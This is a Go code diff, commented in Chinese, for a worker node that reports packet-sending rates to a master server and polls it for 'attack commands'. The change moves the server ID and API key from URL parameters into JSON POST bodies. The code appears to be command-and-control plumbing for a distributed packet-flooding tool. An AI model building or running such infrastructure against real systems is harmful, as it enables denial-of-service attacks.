@@ -56,8 +56,10 @@ func sendHeartbeat() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		// 准备心跳数据
+		// 准备心跳数据，将serverId和apiKey移到请求体中
 		heartbeatData := map[string]interface{}{
+			"serverId":    config.ServerID,
+			"apiKey":      config.APIKey,
 			"packetsSent": atomic.LoadUint64(&packetsSent),
 			"packetsRate": atomic.LoadUint64(&packetsRate),
 		}
@@ -69,14 +71,10 @@ func sendHeartbeat() {
 		}
 		taskMutex.RUnlock()
 
-		// 将serverId和apiKey从JSON体移到URL参数中
-		// 使用url.QueryEscape处理特殊字符
-		heartbeatURL := fmt.Sprintf("%s/api/heartbeat?serverId=%d&apiKey=%s", 
-			config.MasterURL, 
-			config.ServerID, 
-			url.QueryEscape(config.APIKey))
+		// 构建心跳URL - 不再包含查询参数
+		heartbeatURL := fmt.Sprintf("%s/api/heartbeat", config.MasterURL)
 
-		// 编码剩余数据
+		// 编码请求数据
 		jsonData, err := json.Marshal(heartbeatData)
 		if err != nil {
 			log.Printf("编码心跳数据失败: %v", err)
@@ -107,15 +105,28 @@ func sendHeartbeat() {
 // 监听攻击命令
 func listenForCommands() {
 	for {
-		// 构建完整的API URL
-		// 对API密钥进行URL编码，确保特殊字符正确处理
-		commandURL := fmt.Sprintf("%s/api/commands?serverId=%d&apiKey=%s", 
-			config.MasterURL, config.ServerID, url.QueryEscape(config.APIKey))
+		// 构建命令URL和请求体 - 将serverId和apiKey作为JSON请求体
+		commandURL := fmt.Sprintf("%s/api/commands", config.MasterURL)
+		requestData := map[string]interface{}{
+			"serverId": config.ServerID,
+			"apiKey":   config.APIKey,
+		}
 		
-		// 在实际环境中，这里应该使用 WebSocket 长连接或长轮询
-		// 为了简单起见，我们使用短轮询
+		// 编码请求数据
+		jsonData, err := json.Marshal(requestData)
+		if err != nil {
+			log.Printf("编码请求数据失败: %v", err)
+			time.Sleep(5 * time.Second)
+			continue
+		}
+		
+		// 发送命令请求
 		log.Printf("获取命令: %s", commandURL)
-		resp, err := http.Get(commandURL)
+		resp, err := http.Post(
+			commandURL,
+			"application/json",
+			bytes.NewBuffer(jsonData),
+		)
 		if err != nil {
 			log.Printf("获取命令失败: %v", err)
 			time.Sleep(5 * time.Second)
